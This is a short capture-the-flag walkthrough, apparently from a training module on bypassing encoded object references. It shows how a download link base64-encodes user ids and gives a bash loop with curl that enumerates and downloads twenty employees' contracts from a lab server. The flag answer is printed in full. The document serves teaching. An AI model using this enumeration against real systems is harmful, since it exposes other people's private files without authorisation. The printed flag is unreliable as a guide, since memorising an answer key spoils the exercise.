# Bypassing Encoded References
## Questions
1. Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly. **Answer: HTB{h45h1n6_1d5_w0n7_570p_m3}**
   - Visit `/contract.php`, we know how the frontend is calculating the contract name:
        ```html
        <script>
            function downloadContract(uid) {
            window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
            }
        </script>
        ```
   - Use a simple for loop to mass enumerate the downloadable contracts then read them to capture the flag:
        ```shellsession
        $ for i in {1..20}; do 
        for hash in $(echo -n $i | base64 -w 0); do 
        curl -sOJ http://154.57.164.70:32580//download.php?contract=$hash 
        done 
        done
        $ cat contract*
        HTB{h45h1n6_1d5_w0n7_570p_m3}
        ```